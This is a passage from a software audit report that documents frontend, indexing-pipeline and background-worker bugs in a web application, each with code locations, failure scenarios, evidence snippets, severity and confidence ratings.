- **Confidence**: certain about the types and the data path; the failure requires a table above 2^31 rows, which `SELECT max(row_count) FROM db_index` on production would confirm is not yet present.

---

## FE-01 — A request that hits the client's own 60 s timeout is retried twice instead of failing, so one GET becomes three requests and ~182 s of waiting

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/lib/api/_client.ts:110`, `:134`, `:137-138`
- **What is wrong**: The timeout aborts with a *reason string* (`controller.abort("Request timed out")`). Per the fetch spec the promise then rejects **with that string**, not with a `DOMException`. The guard on line 134 tests `err instanceof DOMException`, so it never matches a timeout; execution falls to line 137, which wraps the string in an `Error`, and line 138 then treats it as a retryable transport failure for any safe method. The `throw` on line 135 — the intended behaviour — is dead code for the path it was written for.
- **Concrete failure**: The backend is slow or wedged (this is a real state for this product — `db_index` `fetch_samples` ran 8 h 25 m in production). A user opens the app. `GET /projects` hangs. Instead of an error at 60 s, the client fires the same request again at 60.6 s and a third time at 121.5 s, and the user stares at the loading state for **~182 seconds** before seeing `Request timed out` — without the "Please try again." the code intends. Meanwhile the struggling backend has received 3× the load.
- **Evidence**: Verbatim transcription of the retry core against a server that accepts and never answers (`timeoutMs: 300` to keep the test short):
  ```
  attempt 0 timed out at +313ms -> RETRYING
  attempt 1 timed out at +1220ms -> RETRYING
  final error message: "Request timed out"
  server saw 3 requests for ONE client call
  ```
  And the rejection shape, confirmed separately: `typeof string | instanceof DOMException: false`.
- **Severity**: high — it triples request load exactly when the server is least able to take it, and turns a 60 s budget into a 3-minute one.
- **Confidence**: certain — reproduced against the real code path on Node 26's undici; browser fetch follows the same spec clause. A one-line check (`|| typeof err === "string"`, or aborting with no reason) settles it.

---

## FE-02 — A session poll that lands after the user has switched conversations drags them back to the old one

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/hooks/useSessionPolling.ts:60-63`
- **What is wrong**: `poll()` closes over `sessionId` from the effect that started it. The effect's cleanup clears the `setInterval`, but an already-awaited `Promise.all` is not cancelled and nothing re-checks which session is active when it resolves. Line 62 then calls `store.setActiveSession(updatedSession)` for the *old* session — and `setActiveSession` (`app-store.ts:229-239`) also swaps `messages` to that session's cache, so the whole panel changes underneath the user.
- **Concrete failure**: Session A is `processing` (the user asked a question and navigated away). They come back, the poll starts, and within the 100–500 ms round trip they click session B in the sidebar. B renders, then the A-poll resolves and the app switches back to A — title, message list and all. Their click appears to have been ignored.
- **Evidence**:
  ```ts
  const [sessions, msgs] = await Promise.all([
    api.chat.listSessions(projectId),
    api.chat.getMessages(sessionId),
  ]);
  const store = useAppStore.getState();
  store.setChatSessions(sessions);
  const updatedSession = sessions.find((s) => s.id === sessionId);
  if (updatedSession) {
    store.setActiveSession(updatedSession);   // no check that sessionId is still active
  }
  ```
  Compare `ChatPanel.tsx:491-494`, which *does* guard the same kind of write (`const isCurrent = state.activeSession?.id === updated.id;`).
- **Severity**: high — it silently discards a navigation the user performed, and the two conversations look alike enough that they may not notice which one they are now typing into.
- **Confidence**: certain — the guard is absent and the sibling call site shows the project already knows the guard is needed.

---

## FE-03 — Any failure of `POST /auth/refresh` signs the user out and bounces them to `/login` with no explanation

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/stores/auth-store.ts:206-214`, with `frontend/src/components/auth/AuthGate.tsx:12-20`
- **What is wrong**: `restore()` wraps the refresh in a bare `catch` that treats *every* failure as "the session is gone" — a 500, a 502, a DNS blip, a CORS failure and a genuine 401 are indistinguishable. `refresh` is a **POST** (`lib/api/auth.ts:59`), so the client's retry path does not apply, and `/auth/*` is excluded from `handleSessionExpired` (`_client.ts:150`), so no session-flash message is stored either. `AuthGate` then sees `user === null` and does `router.replace("/login")`.
- **Concrete failure**: The API restarts (a Heroku deploy, which this repo's own notes say happens on every push to `main`). A user with the app open reloads, or opens a second tab. The single refresh call gets a 502. They land on `/login` with a blank form and no message, and their persisted `auth_user` has been deleted — so the next reload does not even paint their name optimistically. Nothing tells them the session was fine and the server was not.
- **Evidence**:
  ```ts
  try {
    const res = await api.auth.refresh();
    storeAuth(set, res); scheduleRefresh(set, res);
  } catch {
    storage.removeItem("auth_token");
    storage.removeItem("auth_user");
    set({ user: null, token: null });      // 502 and 401 handled identically
  }
  ```
  The error object already carries `status` (added at `_client.ts:189`), and `logout()` at `auth-store.ts:156-157` already discriminates on it — so the information is available here and is not used.
- **Severity**: high — an unauthenticated redirect is the most disruptive thing a SPA can do, and it fires on transient infrastructure noise.
- **Confidence**: certain.

---

## FE-04 — A dashboard that failed to load reports itself as "Dashboard not found"

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/app/dashboard/[id]/page.tsx:198-202` and `:271-283`
- **What is wrong**: `loadDashboard` catches every error into a toast and leaves `dashboard` at `null`; `finally` clears `loading`. The render then reaches the `!dashboard` branch, whose only content is the sentence "Dashboard not found" and a link back to the app. A network failure, a 500, a 504 and a genuine 404 all produce the same permanent screen — and the toast that carried the real reason auto-dismisses after 10 s (`toast-store.ts:18`), leaving a false statement on screen indefinitely.
- **Concrete failure**: A teammate sends a `/dashboard/<id>` link. The API is briefly down. The recipient opens it, sees a red toast flash by, and is left on a page saying the dashboard does not exist. They reply "that link is broken" and the dashboard is never opened again. There is no Retry on this screen — only "Back to app".
- **Evidence**:
  ```ts
  } catch (err) {
    if (!signal.stale) toast(err instanceof Error ? err.message : "Failed to load dashboard", "error");
  } finally { if (!signal.stale) setLoading(false); }
  ...
  if (!dashboard) {
    return ( … <p className="text-sm text-text-muted">Dashboard not found</p> … );
  }
  ```
  The project already ships `components/ui/ListError.tsx` for exactly this ("keeps a failed fetch visually distinct from a legitimately empty list and offers a retry") and uses it in `RunsTab.tsx:73`, `ErrorsTab.tsx`, and the connections list. This route is not on that pattern.
- **Severity**: high — the page asserts a fact about the user's data that it did not establish, on a shareable URL.
- **Confidence**: certain.

---

## FE-05 — After a page reload, a clarification question the agent asked becomes unanswerable

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/components/chat/ChatSessionList.tsx:14-40` (`mapDtoToMessages`), consumed at `ChatMessage.tsx:401`
- **What is wrong**: The backend persists `clarification_data` and `continuation_context` inside `metadata_json` (`backend/app/api/routes/chat.py:499`, `:1261`). `mapDtoToMessages` — the single function that rebuilds history for a reload, a session switch and the background-processing poll — reads `query`, `query_explanation`, `visualization`, `error`, `staleness_warning`, `response_type`, `raw_result` and `sql_results` from that blob, and neither of those two. `ChatMessage` gates the interactive card on `message.clarificationData`, so it simply does not render.
- **Concrete failure**: The agent replies with a `clarification_request` ("Which date range did you mean?" + three options). The user reloads the tab, or switches to another chat and back. The message still shows the amber **"Question"** chip and the question text, but the multiple-choice card with the answer buttons is gone — the response type is restored, the payload it needs is not. There is no way to answer except retyping. Separately, a `step_limit_reached` message keeps its "Continue analysis" button but now passes `null` for the context (`ChatPanel.tsx:625` → `handleContinueAnalysis(null)`), so the continuation restarts without the state the backend saved for it.
- **Evidence**:
  ```ts
  // ChatSessionList.tsx:22-38 — the whole returned object; no clarificationData, no continuationContext
  return { id, role, content, query, queryExplanation, visualization, error,
           metadataJson, stalenessWarning, responseType, userRating, toolCallsJson,
           rawResult, timestamp, sqlResults: _hydrateSqlResults(meta.sql_results) };
  ```
  ```tsx
  // ChatMessage.tsx:401 — the card is conditional on the field that was never restored
  {isClarification && message.clarificationData && onSendMessage && ( <ClarificationCard … /> )}
  ```
- **Severity**: high — it strands the conversation: the product asked a question and then removed the means of answering it, and the chip still claims a question is pending.
- **Confidence**: certain — both the backend write and the frontend read were verified.

---

## KNOW-02 — `generate_docs` deletes the symbol chunks `code_symbol_embed` wrote earlier in the same run, for every file that has both

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:1251-1255` (and the retry copy at `:1353-1357`), against the write at `:648-660` → `_run_code_symbol_embed` → `code_symbol_chunker.py:275`.
- **What is wrong**: step 5d (`code_symbol_embed`, line 648) runs *before* step 9 (`generate_docs`, line ~1060). Symbol chunks carry `source_path = symbol.file_path` (`code_symbol_chunker.py:93`, repo-relative). `delete_by_source_path` deletes *every* chunk whose metadata `source_path` matches — it does not filter by kind or id prefix (`vector_store.py:283-303`, `pgvector_store.py:278-291`). `generate_docs` calls it for each regenerated document (`:1251`) and then re-adds only the LLM prose chunks. The symbol chunks for that path are gone until the next full run repeats the cycle.
- **Concrete failure**: `app/Models/User.php` yields a `class` symbol plus ~20 `method` symbols, and it is also an `orm_model` document. On every run where its document is regenerated, its ~21 raw-source chunks are written at step 5d and deleted at step 9. The raw bodies of exactly the files the product's code-Q&A most needs — ORM models, migrations, the 722 "schemas" of `esim-php` — are never retrievable from the dense leg. Worse since 2026-08-27: `code_symbol_embed` is now checkpoint-gated (`:651`, `"code_symbol_embed" not in done`), so on a *resume* it is skipped entirely while `generate_docs` keeps deleting, and the loss becomes permanent for that run.
- **Evidence**:
  ```
  pipeline_runner.py:1251     await asyncio.to_thread(
  pipeline_runner.py:1252         self._vector_store.delete_by_source_path,
  pipeline_runner.py:1253         project_id,
  pipeline_runner.py:1254         edoc.file_path,
  pipeline_runner.py:1255     )
  ```
  ```
  vector_store.py:291   where={"$or": [{"source_path": source_path}, {"path": source_path}]},
  ```
  The BM25 leg does *not* lose them — `_run_bm25_build` rebuilds symbol entries from `code_graph_symbols` (`pipeline_runner.py:1471`, `bm25_corpus.py:131-148`) — so the two retrieval legs disagree about which symbols exist for precisely these files, and `HybridRetriever._fuse` has nothing to fuse.
- **Severity**: high — a designed capability ("surface actual function/class source, not only the LLM-generated prose", `code_symbol_chunker.py:8`) is switched off for the highest-value files, silently and on every run.
- **Confidence**: certain. Settled by comparing, for one ORM-model path, `SELECT count(*) FROM doc_embeddings WHERE project_id=… AND metadata->>'source_path'='app/Models/User.php' AND id LIKE 'sym:%'` (expected 0) against the same project's `code_graph_symbols` count for that file.

---

## KNOW-03 — Symbol chunk ids embed `start_line`, and nothing sweeps a *changed* file, so every line shift leaves the old source body in the vector store forever

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/chunk_metadata.py:82` (`f"sym:{source_path}:{uid}@{start_line}:{chunk_index}"`); the only three `delete_by_source_path` call sites are `pipeline_runner.py:536` (deleted files only), `:1252` and `:1353` (doc-bearing paths only).
- **What is wrong**: `symbol_chunk_id` is a pure function of `(path, uid, start_line)`, and `start_line` moves whenever anything above the symbol changes. `CodeSymbolChunker.embed_symbols` only ever upserts; it never deletes. `cleanup_deleted` sweeps deleted paths, and `generate_docs` sweeps paths that produce a `KnowledgeDoc`. A source file that changed but produces no document — which `repo_analyzer._analyze_file` restricts to DB-relevant files, so the large majority of a repository — is swept by nothing. The old chunk keeps the pre-edit source text under an id no longer derivable from the database.
- **Concrete failure**: `app/Http/Controllers/OrderController.php`, 40 symbols, no ORM/migration/SQL pattern so no document. Add one `use` line at the top: all 40 symbols shift by 1, 40 new ids are upserted, the 40 old ids remain with the *previous* bodies. After ten such commits over ten nightly runs the collection holds up to 440 chunks for 40 symbols, 400 of them stale code. Production shape: `pipeline_end: completed (Indexed 10228 files, 722 schemas)` against 763 documents — so ~9 500 indexed files are in the unswept class. The dense leg can and will return a deleted `if` branch or a removed parameter as current source; BM25 carries only the current `@start_line` id (`bm25_corpus.py:137`, `chunk_index=0`), so the stale chunk arrives dense-only, unfused and unflagged.
- **Evidence**:
  ```
  chunk_metadata.py:82   return f"sym:{source_path}:{uid}@{start_line}:{chunk_index}"

  $ grep -rn "delete_by_source_path" app/ | grep -v "def delete_by_source_path"
  app/knowledge/pipeline_runner.py:536   # cleanup_deleted  — state.deleted_files
  app/knowledge/pipeline_runner.py:1252  # generate_docs    — edoc.file_path
  app/knowledge/pipeline_runner.py:1353  # generate_docs retry
  ```
  The module docstring at `chunk_metadata.py:3-11` records the same class of bug being fixed for *deleted* files ("~25 000 symbol chunks for deleted code survived every re-index"); the changed-file case was not covered by that fix.
- **Severity**: high — serves outdated source code as current, which is the failure mode `vision.md` §7 ("every answer traceable", "freshness tracked") is written to prevent, and it grows monotonically between full rebuilds.
- **Confidence**: certain on the mechanism. Settled by `SELECT metadata->>'source_path', count(*) FROM doc_embeddings WHERE project_id=… AND id LIKE 'sym:%' GROUP BY 1 ORDER BY 2 DESC` compared to per-file symbol counts in `code_graph_symbols`.

---

## KNOW-04 — On an incremental run the CALLS resolver only sees the changed files, so every changed file loses its out-edges to unchanged files — permanently

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:1810` (`builder.build(state.parsed_files)`); `backend/app/knowledge/code_graph.py:320-328` (indexes built from `parsed_files` only); `backend/app/services/code_graph_service.py:173-181` (delete of every edge sourced by an affected file).
- **What is wrong**: `_resolve_call` resolves a callee through `file_local`, `import_map` and `global_index` (`code_graph.py:537-575`). All three are built from `all_symbols`, which is the union of the symbols in `parsed_files` (`:290-292`, `:320-328`). On an incremental run `parsed_files` holds only the changed files plus their **reverse** dependents — `reverse_dependents` returns files that *import symbols defined in* the changed files (`code_graph.py:591-604`), i.e. the callers, never the callees. A call from a changed file into an unchanged file therefore has no candidate to resolve against and emits no edge. `save_incremental` has meanwhile deleted every edge sourced by that file's symbols, so the previously-resolved edge is destroyed and not replaced.
- **Concrete failure**: `app/Services/BillingService.php` calls `InvoiceRepository::find()`, defined in `app/Repositories/InvoiceRepository.php`. A full rebuild resolves it through the global index at `_CONF_GLOBAL_UNIQUE` and stores a CALLS edge. Edit one line of `BillingService.php` and let the nightly run: only that file (and its importers) is parsed, `global_index["find"]` is empty, no edge is produced, and `code_graph_service.py:176-181` has already deleted the old one. "Which endpoint touches this table?" — the question `graph_db_bridge` exists to answer — silently loses that path. Every nightly run strips a little more; only `force_full` restores it. This is not the documented "locally accurate, not globally complete" tradeoff of `_collect_files_for_ast:1533`, which is about *new* edges; this is destruction of edges a previous full rebuild had already established.
- **Evidence**:
  ```
  code_graph.py:326     for s in all_symbols:                 # all_symbols == symbols of parsed_files
  code_graph.py:328         global_index[s.name].append(s)

  code_graph_service.py:176   if doomed_uids:
  code_graph_service.py:177       src_predicates.append(CodeGraphEdge.src_uid.in_(doomed_uids))
  code_graph_service.py:178   await session.execute(delete(CodeGraphEdge).where(... or_(*src_predicates)))
  ```
- **Severity**: high — an incremental run and a full rebuild produce measurably different graphs for the same commit, and the incremental one is strictly lossier; nothing reports the shrinkage because `save_incremental` returns *project totals* (`code_graph_service.py:246-262`), which the symbol count keeps stable.
- **Confidence**: likely → certain on the code path; the size of the effect is unmeasured. Settled by recording `SELECT count(*) FROM code_graph_edges WHERE project_id=… AND edge_type='CALLS'` before and after one nightly incremental, then after a `force_full` on the same commit.

---

## KNOW-05 — The full-rebuild graph path has no zero-symbol guard, so a parser outage wipes the entire code graph and reports "completed"

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:1802-1814` against the guard the incremental path has at `:1851-1867`; `backend/app/services/code_graph_service.py:60-64` (unconditional delete-then-insert).
- **What is wrong**: `_run_graph_build` skips only when `parsed_files` is *empty* (`:1802`). A `ParsedFile` carrying `parse_errors` and zero symbols is still stored in `state.parsed_files` (`:1697-1706`), so `parsed_files` is non-empty while `graph.symbols` is empty. `save()` then deletes every `CodeGraphSymbol` and `CodeGraphEdge` for the project and inserts nothing, returns `(0, 0)`, and `_run_graph_build` returns `True` — so the step is emitted as `completed` and checkpointed at `:628`. The incremental branch guards exactly this case, with a comment explaining why ("skipping merge to preserve graph"); the full branch does not.
- **Concrete failure**: `tree_sitter_language_pack.get_parser` raises for the repo's dominant language — an ABI mismatch after a dependency bump, or a `MemoryError` loading a grammar on the 512 MiB→1 GiB worker. `_get_parser` logs one `WARNING` and returns `None` (`ast_parser.py:1039-1041`), so every file returns `parse_errors=[parser_unavailable]` with zero symbols. A `force_full` rebuild — which is what a schema bump or `reconcile_embeddings` enqueues — then deletes `esim-php`'s 25 695 symbols and 68 263 edges, emits `graph_build completed — Persisted 0 symbols, 0 edges`, and the run reaches `pipeline_end` as a success. The BM25 symbol corpus is rebuilt from the same emptied table two steps later (`:1471`), so the lexical leg loses the symbols too, in the same run.
- **Evidence**:
  ```
  pipeline_runner.py:1802   if not state.parsed_files and is_full:
  pipeline_runner.py:1803       logger.info("graph_build: no parsed files, skipping")
  pipeline_runner.py:1804       return True
  ...
  pipeline_runner.py:1812   if is_full:
  pipeline_runner.py:1814       sym_count, edge_count = await svc.save(db, project_id, graph)
  ```
  versus
  ```
  pipeline_runner.py:1851   if not graph.symbols and reconciled_changed:
  pipeline_runner.py:1857       ... "skipping merge to preserve graph"
  ```
  `code_graph_service.py:60-64` performs the unguarded `delete(CodeGraphSymbol)` / `delete(CodeGraphEdge)`.
- **Severity**: high — one transient environmental fault destroys the module's entire output and is reported as a successful run; recovery requires a second full rebuild (3.3 h) that nobody knows is owed.
- **Confidence**: certain. A unit test that hands `_run_graph_build` a `parsed_files` dict of `ParsedFile(parse_errors=[…], symbols=[])` with `is_full=True` and asserts the existing rows survive would fail today.

---

## KNOW-06 — `_incremental_update` never drops an entity whose defining file changed and no longer defines it, so removed models accumulate in the knowledge cache forever

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/entity_extractor.py:494-497` (merge from cache by name) and `:548-551` (removal restricted to `deleted_set`).
- **What is wrong**: on an incremental run, `schemas` covers only the changed files, so `_extract_entities_from_schemas` produces entities only for those. The loop at `:495-497` then copies **every** cached entity whose name is not in that fresh set. The only removal is `:549-551`, which deletes entities whose `file_path` is in `deleted_files`. An entity defined in a file that still exists but no longer declares it satisfies neither condition, so it survives — and survives again on every subsequent run, because it is re-copied from the cache each time.
- **Concrete failure**: `class LegacyOrder` is deleted from `app/Models/Legacy.php` while the file itself remains. The commit puts `app/Models/Legacy.php` in `changed_files`, not `deleted_files`. `_extract_entities_from_schemas` no longer yields `LegacyOrder`; `:496` copies it back from `cached.entities`; `:550` does not delete it because its `file_path` is not in `deleted_set`. `LegacyOrder` — with its inferred `table_name` `legacy_orders`, its columns and its relationships — is then written into `project_caches`, into `generate_summary_doc`, into every doc's `enrichment_context` (`indexing_pipeline.py:113-126`), and into `graph_db_bridge`'s lineage. A full rebuild removes it; nothing else ever does. This is the "inferred value stored as if declared" pattern one step removed: the entity was correctly extracted once and is now asserted long after its evidence is gone.
- **Evidence**:
  ```
  entity_extractor.py:494   _extract_entities_from_schemas(schemas, knowledge, detected_orms)
  entity_extractor.py:495   for name, entity in cached.entities.items():
  entity_extractor.py:496       if name not in knowledge.entities:
  entity_extractor.py:497           knowledge.entities[name] = entity
  ...
  entity_extractor.py:548   deleted_set = set(deleted_files or [])
  entity_extractor.py:549   for name in list(knowledge.entities.keys()):
  entity_extractor.py:550       if knowledge.entities[name].file_path in deleted_set:
  entity_extractor.py:551           del knowledge.entities[name]
  ```
  Note `stale_set` (`:499`, changed ∪ deleted) is used for enums, service functions, config refs, validation rules, query patterns, constant mappings and scope filters — every collection *except* `entities`.
- **Severity**: high — it feeds phantom models and phantom table names into the orchestrator prompt and into the code↔DB map, which is the exact class of defect the `is_plausible_table_name` / `tables_declared_in_migration` work of 2026-08-27 was undertaken to close, arriving by a different route.
- **Confidence**: certain. Settled by a unit test on `_incremental_update`: cache one entity from `f.php`, pass `schemas=[]`, `changed_files=["f.php"]`, `deleted_files=[]`, and assert the entity is gone — it is not.

---

## KNOW-07 — `code_symbol_embed` swallows every failure, reports a count taken from its input, and then checkpoints itself as complete

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:1638-1649` (blanket `except`), `:1626-1637` (count from `parsed_files`), `:660` (`complete_step` runs unconditionally after), plus `backend/app/knowledge/code_symbol_chunker.py:272-278` (per-batch `except` → `WARNING`, loop continues).
- **What is wrong**: three layers each turn a failure into a non-event. `_flush` catches any exception per 200-chunk batch and continues, so a store that rejects everything produces no signal but log warnings. `_run_code_symbol_embed` catches everything above that. On the success path it computes `symbol_count` from `parsed_files` — what it *intended* to embed — and emits it as "Upserted". Control then returns to `:659`, and `:660` unconditionally records `complete_step(db, cp_id, "code_symbol_embed")`. Since 2026-08-27 that record is read (`:651`), so a failed step is skipped on resume.
- **Concrete failure**: the Supavisor pooler saturates (`psycopg_pool.PoolTimeout`, observed on production 2026-09-09 at 02:43:21 per CLAUDE.md) while `PgVectorStore._flush` is writing. Every batch raises, `_flush` logs a warning per batch and returns, `embed_symbols` returns normally, and the workflow event reads `code_symbol_embed completed — Upserted code symbols from 10228 file(s) (26014 symbols)` with zero rows written. `complete_step` records it. If the run later resumes, `:651` skips the step. The run reaches `pipeline_end`, `record_index` advances `last_sha` (`:1963-1970`), the checkpoint is deleted (`:2017`), and the next incremental run has no reason to revisit any of those files. 26 014 symbol chunks are missing with a green run behind them.
- **Evidence**:
  ```
  pipeline_runner.py:1626   symbol_count = sum(len(pf.symbols) for pf in parsed_files.values())
  pipeline_runner.py:1632   await tracker.emit(wf_id, "code_symbol_embed", "completed",
  pipeline_runner.py:1636       f"Upserted code symbols from {len(parsed_files)} file(s) ({symbol_count} symbols)")
  pipeline_runner.py:1638   except Exception:
  pipeline_runner.py:1639       logger.warning("code_symbol_embed: non-fatal failure for project %s", ...)
  ```
  ```
  pipeline_runner.py:659    await self._run_code_symbol_embed(state, project_id, wf_id)
  pipeline_runner.py:660    await self._cp_svc.complete_step(db, cp_id, "code_symbol_embed")
  ```
  `code_symbol_chunker.py:262-278`: `_flush` has no return value and no counter; the caller cannot tell success from total failure.
- **Severity**: high — the pattern CLAUDE.md flags repeatedly ("three claims computed from the input instead of the outcome, in a row") reproduced verbatim, and the 2026-08-27 checkpoint gate converted a retryable failure into a permanent one.
- **Confidence**: certain on the code path; whether it has fired in production is unknown. Settled by `grep -c 'code_symbol_chunker: failed to upsert' ` over the worker log for any run that also emitted `code_symbol_embed completed`.

---

## KNOW-08 — Checkpoint resume ignores `force_full`, so the nightly incremental silently continues an abandoned full rebuild under the incremental ceiling — and the test written to prevent this asserts on the flag, not the work

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/api/routes/repos.py:615-630`; `backend/app/knowledge/pipeline_runner.py:298-306` (restores `last_sha`/`changed_files` from the checkpoint); `backend/app/services/daily_knowledge_sync_service.py:398-400`; `backend/tests/unit/services/test_repo_index_ceiling.py:132-141`.
- **What is wrong**: `_run_index_background` reuses whatever `IndexingCheckpoint` exists whenever `body.force_full` is false, with no check on how that checkpoint was produced. A checkpoint left by an interrupted `force_full=True` run carries `last_sha = None` and `changed_files` = the entire blob list. On resume, `"detect_changes" in done` restores both verbatim (`pipeline_runner.py:298-303`), so `state.last_sha is None` and every downstream branch behaves as a full rebuild: `is_full_graph = force_full or state.last_sha is None` (`:602`) is `True`, `is_incremental = state.last_sha is not None and not force_full` (`:1044`) is `False`. The nightly run is doing a full rebuild while its own argument says otherwise.
- **Concrete failure**: exactly the situation CLAUDE.md records for 2026-09-09 — three consecutive full rebuilds of `esim-php` orphaned by dyno restarts. `app/ops/orphan_runs.py` marks the `IndexingRun` terminal but touches no checkpoint; `StaleRunReaper` sets `IndexingCheckpoint.status = "interrupted"` (`stale_run_reaper.py:286-289`), which is not `"running"`, so `daily_knowledge_sync_service.py:390` does not skip. The 03:00 cron calls `run_repo_index_task(project_id, force_full=False, …)`, `repos.py:617` reuses the interrupted full-rebuild checkpoint, and the run inherits ~10 000 changed files and a full graph rebuild — under `daily_knowledge_sync_job_timeout_seconds` = 7 200, not `repo_index_job_timeout_seconds` = 21 600. A cold full rebuild measures 12 039–12 329 s, so ARQ cancels it mid-`generate_docs`, which leaves another interrupted checkpoint, and the next night repeats.
- **Evidence**:
  ```
  repos.py:615   existing_cp = await _checkpoint_svc.get_active(db, project_id)
  repos.py:617   if existing_cp and not body.force_full:
  repos.py:618       existing_cp.workflow_id = wf_id
  repos.py:619       existing_cp.status = "running"
  repos.py:622       checkpoint = existing_cp
  ```
  ```
  pipeline_runner.py:298   if "detect_changes" in done:
  pipeline_runner.py:299       state.head_sha = checkpoint.head_sha
  pipeline_runner.py:300       state.last_sha = checkpoint.last_sha        # None, from the full run
  pipeline_runner.py:301       state.changed_files = CheckpointService.get_changed_files(checkpoint)
  ```
  The guard that is supposed to catch this checks a source string:
  ```
  test_repo_index_ceiling.py:137   assert "force_full=False" in call, (
  ```
  CLAUDE.md states the invariant this violates: "the two ceilings cover different work and must not be tied together."
- **Severity**: high — a repeating, self-perpetuating nightly failure whose logs show an incremental run being cancelled by a timeout sized for incremental work, so the symptom points away from the cause.
- **Confidence**: likely. Settled by reading, for one cancelled nightly run, the `IndexingCheckpoint.last_sha` (expect `NULL`) and `json_array_length(changed_files_json)` (expect thousands) at the moment `_run_index_background` adopted it — or by the log pair `pipeline_resume started (N steps done…)` immediately followed by `ast_parse: Parsing AST for 10228 file(s)` in a `force_full=False` run.

---

## OPS-01 — The worker process never initialises Sentry, so no background-job failure is ever reported

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/main.py:75-77` (the only call site) vs `backend/app/worker.py:285-352` (`startup`, which calls `configure_logging` and nothing else observability-related)
- **What is wrong**: `init_sentry()` is invoked once, at import time of `app/main.py`, which only the `web` dyno loads. `arq app.worker.WorkerSettings` never imports `app.main`, so `sentry_sdk.init` is never called in the worker. Every exception raised by the repo index, the DB index, the code↔DB sync, the daily sync and the analytics collector — the entire body of work this module owns — reaches only `logger.exception` in the Heroku log stream. Both scrubbing layers, `release`, and suspect-commit attribution are configured for the one process that runs the least risky code.
- **Concrete failure**: `run_repo_index` raises inside `generate_docs` at document 400 of 758 after two hours. `run_repo_index_task` logs a traceback; the run row goes `failed`; Sentry shows nothing. The operator's alerting is a dashboard that has been green throughout the three consecutive orphaned rebuilds of 2026-09-09.
- **Evidence**:
```
$ grep -rn "init_sentry" backend/app --include='*.py'
app/main.py:75:from app.core.sentry import init_sentry  # noqa: E402
app/main.py:77:init_sentry()
app/core/sentry.py:124:def init_sentry() -> bool:
```
`app/worker.py:292-295` is the whole of the worker's logging setup: `configure_logging(json_format=…, level=…)`.
- **Severity**: high — the process that carries every long, memory-constrained, LLM-billed job has no error tracking at all, while the one that does has the shortest-lived failures.
- **Confidence**: certain. The grep above is exhaustive over `app/`.

---

## OPS-02 — The web lifespan runs its boot reaper sweep before the task queue exists — the exact defect fixed in the worker on 2026-09-09, in the file the fix's test does not read

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/main.py:119-121` (`await run_reaper_sweep()`) against `backend/app/main.py:129-132` (`await init_task_queue(redis_url)`)
- **What is wrong**: `StaleRunReaper.reap_once` calls `_requeue`, which calls `app.core.task_queue.enqueue`. `enqueue` routes through the module-level `_arq_pool` that only `init_task_queue` builds. At `main.py:121` that pool is `None`, and no caller of `enqueue("run_repo_index", …)` passes a `coro_factory`, so the call falls to `task_queue.py:150-152` and returns `None`. The web's first reaper pass is therefore structurally incapable of putting back anything it destroys. The worker had the identical ordering and it was corrected (`worker.py:307-330`, init at `:309`, sweeps at `:320` and `:330`), but the regression test walks only `app.worker.startup`.
- **Concrete failure**: a `web` dyno restarts (deploy or platform cycle). Boot reaches `main.py:121`. A manual `index_repo` started on the previous web boot is 6 minutes past its last beat. The sweep flips it to `failed` with `REAP_ERROR`, catalogs it, calls `_requeue` → `enqueue` → `_arq_pool is None` → `No coro_factory for in-process fallback of task run_repo_index` → `Reaper: destroyed index_repo for project X at step graph_build and could NOT put it back`. Nothing rebuilds it. The next `reaper_loop` tick (60 s later) is fine, but the row is already terminal, so the recovery window is gone.
- **Evidence**:
```
119	    from app.core.reaper_loop import run_reaper_sweep
120	
121	    await run_reaper_sweep()
...
129	    from app.core.task_queue import init_task_queue
131	    redis_url = settings.redis_url or None
132	    await init_task_queue(redis_url)
```
and the test that would have caught it (`tests/unit/services/test_worker_can_enqueue.py:36-39`):
```python
def _startup_code() -> str:
    from app import worker
    src = inspect.getsource(worker.startup)
```
- **Severity**: high — a run destroyed at boot and not requeued is exactly the loss `reaper_requeue_enabled` exists to prevent, and `index_repo` is the one kind the nightly cron cannot redo (`force_full=False`).
- **Confidence**: certain. Both orderings are in the same function; the test's source is quoted above.

---

## OPS-03 — Every counter emitted by background work is written into a process that exposes no metrics endpoint

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/core/metrics.py:225-233` (process-wide in-memory singleton), `backend/app/api/routes/metrics.py:62` and `:99` (the only readers, both on `web`), against emitters at `backend/app/services/daily_knowledge_sync_service.py:191`, `backend/app/knowledge/db_index_pipeline.py:782`, `backend/app/services/run_coordinator.py:184-190`
- **What is wrong**: `MetricsCollector` is a plain Python singleton holding `defaultdict`s behind a `threading.Lock`. There is no push, no shared store, no scrape endpoint in the worker (`Procfile`'s `worker` line runs `arq`, not uvicorn). Everything the ARQ jobs increment — `indexing_runs_total`, `indexing_run_duration_seconds`, `daily_sync_budget_near_ceiling_total`, `db_index_sample_budget_exhausted_total` — accumulates in the worker's heap and dies with it. `/api/metrics` and `/api/metrics/prometheus` render the `web` process's collector, which never sees any of them.
- **Concrete failure**: `budget_warning()` fires because a nightly sync took 6 300 s of its 7 200 s ceiling. `record_daily_sync_near_ceiling()` increments `daily_sync_budget_near_ceiling_total` in the worker. The operator opens `/api/metrics/prometheus` on the web dyno: the counter is absent entirely — not zero, absent — because that name was never emitted in that process. The metric documented as "the number that says whether `db_index_fetch_samples_budget_seconds` is set too low" (`metrics.py:155-163`) has the same fate.
- **Evidence**:
```
$ grep -rn "record_daily_sync_near_ceiling\|record_db_index_sample_budget_exhausted" backend/app --include='*.py' | grep -v core/metrics.py
app/knowledge/db_index_pipeline.py:782:  get_metrics_collector().record_db_index_sample_budget_exhausted()
app/services/daily_knowledge_sync_service.py:191:  get_metrics_collector().record_daily_sync_near_ceiling()
$ grep -rn "push_to_gateway" backend/app --include='*.py'      # (no output)
$ cat Procfile
